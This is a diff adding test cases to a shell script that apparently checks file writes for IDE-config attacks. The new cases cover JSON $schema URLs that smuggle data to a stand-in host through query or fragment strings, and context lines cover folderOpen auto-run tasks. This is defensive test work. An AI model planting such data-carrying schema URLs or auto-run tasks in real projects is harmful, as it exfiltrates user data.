@@ -77,5 +77,12 @@ check "mixed-case .Gemini/Settings.json" "/p/.Gemini/Settings.json" '{"mcpServer
 check "UPPER path, no folderOpen"     "/p/.VSCode/Tasks.json"  '{"tasks":[{"label":"x","command":"node s.js"}]}' ALLOW
 check "UPPER name, wrong directory"   "/p/src/TASKS.JSON"      '{"tasks":[{"label":"x","command":"node s.js","runOptions":{"runOn":"folderOpen"}}]}' ALLOW
 
+# --- 2026-10-14: a $schema URL that carries data (IDEsaster exfil) ---------------
+check "schema with query data"     "/p/config.json"   '{"$schema":"https://x.example/s.json?d=abc123","a":1}' ASK
+check "schema with fragment data"  "/p/config.json"   '{"$schema":"https://x.example/s.json#k=abc123"}' ASK
+check "schemastore schema"         "/p/tsconfig.json" '{"$schema":"https://json.schemastore.org/tsconfig","compilerOptions":{}}' ALLOW
+check "vendor schema, no query"    "/p/biome.json"    '{"$schema":"https://biomejs.dev/schemas/1.9.4/schema.json"}' ALLOW
+check "local schema"               "/p/config.json"   '{"$schema":"./schema.json"}' ALLOW
+
 rm -rf "$TMP"
 report
